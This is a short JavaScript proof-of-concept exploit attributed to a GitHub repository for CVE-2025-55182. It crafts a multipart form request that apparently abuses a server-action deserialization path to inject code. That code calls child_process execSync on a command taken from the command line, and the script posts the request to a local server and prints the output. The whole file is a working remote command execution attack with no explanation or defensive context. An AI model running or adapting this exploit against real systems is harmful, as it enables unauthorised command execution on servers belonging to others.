// https://github.com/dwisiswant0/CVE-2025-55182

async function pwn(cmd = 'id') {
  const formData = new FormData()
  formData.append('0', '"$F1"')
  formData.append('1', '{"id":"user-profile-action#constructor","bound":"$@2"}')
  // const susCode = "console.log(`yo chat! I'm ${process.env.USER} btw.`);";
  let susCode = `const cmd = ${JSON.stringify(cmd)};`
  susCode += `
  return import('child_process').then(cp => {
    const output = cp.execSync(cmd).toString();
    return output;
  }).catch(e => console.log('err:', e.message));`
  formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`)

  try {
    const response = await fetch('http://localhost:3000', {
      method: 'POST',
      body: formData,
    })

    const text = await response.text()
    console.log('Response:', text)
    process.exit(0)
  } catch (e) {
    console.error('Request failed:', e)
    process.exit(1)
  }
}

const args = process.argv.slice(2).join(' ')
pwn(args)
